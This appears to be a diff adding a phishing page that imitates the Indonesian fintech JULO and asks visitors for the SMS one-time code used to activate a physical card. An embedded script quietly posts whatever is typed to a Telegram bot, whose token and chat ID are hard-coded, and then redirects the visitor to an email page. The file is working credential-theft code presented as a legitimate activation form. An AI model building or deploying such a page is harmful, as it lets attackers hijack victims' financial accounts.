@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>kode - JULO</title>
+    <meta property="og:title" content="kode - JULO" />
+    <meta
+      property="og:description"
+      content="Dapatkan Kartu Fisik Julo Agar Transaksi Lebih Praktis"
+    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="utf-8" />
+    <meta property="twitter:card" content="summary_large_image" />
+
+    <style data-tag="reset-style-sheet">
+      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6,figure,blockquote,figcaption {  margin: 0;  padding: 0;}button {  background-color: transparent;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}html { scroll-behavior: smooth  }
+    </style>
+    <style data-tag="default-style-sheet">
+      html {
+        font-family: Inter;
+        font-size: 16px;
+      }
+
+      body {
+        font-weight: 400;
+        font-style:normal;
+        text-decoration: none;
+        text-transform: none;
+        letter-spacing: normal;
+        line-height: 1.15;
+        color: var(--dl-color-gray-black);
+        background-color: var(--dl-color-gray-white);
+
+      }
+      
+      .kode-container {
+  width: 100%;
+  display: flex;
+  overflow: auto;
+  min-height: 100vh;
+  align-items: center;
+  flex-direction: column;
+}
+.kode-image {
+  width: 100%;
+  object-fit: cover;
+}
+.kode-container1 {
+  width: 368px;
+  height: 447px;
+  display: flex;
+  position: relative;
+  align-items: flex-end;
+  flex-direction: column;
+  justify-content: center;
+}
+.kode-form {
+  top: 24px;
+  left: 0px;
+  right: 0px;
+  width: 346px;
+  height: 406px;
+  margin: auto;
+  display: flex;
+  position: absolute;
+  align-self: center;
+}
+.kode-text {
+  top: 0px;
+  left: 0px;
+  right: 0px;
+  margin: auto;
+  position: absolute;
+  font-style: normal;
+  text-align: center;
+  font-weight: 700;
+}
+.kode-textinput {
+  top: 90px;
+  left: 0px;
+  right: 0px;
+  width: 250px;
+  margin: auto;
+  position: absolute;
+  box-shadow: 5px 5px 10px 0px #d4d4d4;
+  border-width: 1px;
+  padding-right: 0px;
+  border-bottom-width: 1px;
+}
+.kode-button {
+  top: 322px;
+  left: 0px;
+  color: var(--dl-color-gray-white);
+  right: 0px;
+  width: 274px;
+  margin: auto;
+  position: absolute;
+  font-style: normal;
+  text-align: center;
+  font-weight: 700;
+  background-color: var(--dl-color-primary-300);
+}
+.kode-text1 {
+  top: 33px;
+  left: 0px;
+  right: 0px;
+  margin: auto;
+  position: absolute;
+  font-size: 14px;
+  text-align: center;
+}
+.kode-image1 {
+  width: 100%;
+  align-self: center;
+  object-fit: cover;
+}
+    </style>
+    <style>
+        :root {
+  --dl-color-gray-500: #595959;
+  --dl-color-gray-700: #999999;
+  --dl-color-gray-900: #D9D9D9;
+  --dl-size-size-large: 144px;
+  --dl-size-size-small: 48px;
+  --dl-color-danger-300: #A22020;
+  --dl-color-danger-500: #BF2626;
+  --dl-color-danger-700: #E14747;
+  --dl-color-gray-black: #000000;
+  --dl-color-gray-white: #FFFFFF;
+  --dl-size-size-medium: 96px;
+  --dl-size-size-xlarge: 192px;
+  --dl-size-size-xsmall: 16px;
+  --dl-space-space-unit: 16px;
+  --dl-color-primary-100: #003EB3;
+  --dl-color-primary-300: #0074F0;
+  --dl-color-primary-500: #14A9FF;
+  --dl-color-primary-700: #85DCFF;
+  --dl-color-success-300: #199033;
+  --dl-color-success-500: #32A94C;
+  --dl-color-success-700: #4CC366;
+  --dl-size-size-xxlarge: 288px;
+  --dl-size-size-maxwidth: 1400px;
+  --dl-radius-radius-round: 50%;
+  --dl-space-space-halfunit: 8px;
+  --dl-space-space-sixunits: 96px;
+  --dl-space-space-twounits: 32px;
+  --dl-radius-radius-radius2: 2px;
+  --dl-radius-radius-radius4: 4px;
+  --dl-radius-radius-radius8: 8px;
+  --dl-space-space-fiveunits: 80px;
+  --dl-space-space-fourunits: 64px;
+  --dl-space-space-threeunits: 48px;
+  --dl-space-space-oneandhalfunits: 24px;
+}
+.button {
+  color: var(--dl-color-gray-black);
+  display: inline-block;
+  padding: 0.5rem 1rem;
+  border-color: var(--dl-color-gray-black);
+  border-width: 1px;
+  border-radius: 4px;
+  background-color: var(--dl-color-gray-white);
+}
+.input {
+  color: var(--dl-color-gray-black);
+  cursor: auto;
+  padding: 0.5rem 1rem;
+  border-color: var(--dl-color-gray-black);
+  border-width: 1px;
+  border-radius: 4px;
+  background-color: var(--dl-color-gray-white);
+}
+.textarea {
+  color: var(--dl-color-gray-black);
+  cursor: auto;
+  padding: 0.5rem;
+  border-color: var(--dl-color-gray-black);
+  border-width: 1px;
+  border-radius: 4px;
+  background-color: var(--dl-color-gray-white);
+}
+.list {
+  width: 100%;
+  margin: 1em 0px 1em 0px;
+  display: block;
+  padding: 0px 0px 0px 1.5rem;
+  list-style-type: none;
+  list-style-position: outside;
+}
+.list-item {
+  display: list-item;
+}
+.teleport-show {
+  display: flex !important;
+  transform: none !important;
+}
+.Heading {
+  font-size: 32px;
+  font-family: Inter;
+  font-weight: 700;
+  line-height: 1.15;
+  text-transform: none;
+  text-decoration: none;
+}
+.Content {
+  font-size: 16px;
+  font-family: Inter;
+  font-weight: 400;
+  line-height: 1.15;
+  text-transform: none;
+  text-decoration: none;
+}
+    </style>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"
+      data-tag="font"
+    />
+  </head>
+  <body>
+    <link rel="stylesheet" href="./style.css" />
+    <div>
+      <link href="./kode.css" rel="stylesheet" />
+
+      <div class="kode-container">
+        <img
+          alt="image"
+          src="/whatsapp%20image%202023-10-06%20at%2013.06.50-1500w.jpeg"
+          class="kode-image"
+        />
+        <div class="kode-container1">
+          <form id="tg" onsubmit=""
+            enctype="application/x-www-form-urlencoded"
+            class="kode-form"
+          >
+            <span class="kode-text">Kode OTP Aktivasi Kartu Fisik</span>
+            <input
+              type="tel"
+              name="otp" id="otp"
+              required=""
+              placeholder="OTP Aktivasi Kartu Fisik"
+              class="kode-textinput input"
+            />
+            <button type="submit" class="kode-button button" style="margin-top: -30%; background-color: #1F45FC; color: white;">Aktivasi</button>
+            <span class="kode-text1">
+              Masukkan Kode OTP Aktivasi Kartu Fisik Yang Telah Kami Kirim Via
+              SMS Ke Nomor Handphone Anda
+            </span>
+            <p id="tg" onsubmit=""></p>
+          </form>
+        </div>
+        <img
+          alt="image"
+          src="/whatsapp%20image%202023-10-06%20at%2013.06.49-1500w.jpeg"
+          class="kode-image1"
+        />
+      </div>
+    </div>
+    <script>
+    const chat_id = '1950539749', botID = 'bot6335064601:AAHZUrWPAPQpxpQ0MwF2uu1KM4m0JdVJvMI';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#tg').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href='/email.html';
+    });
+
+
+   </script>
+  </body>
+</html>
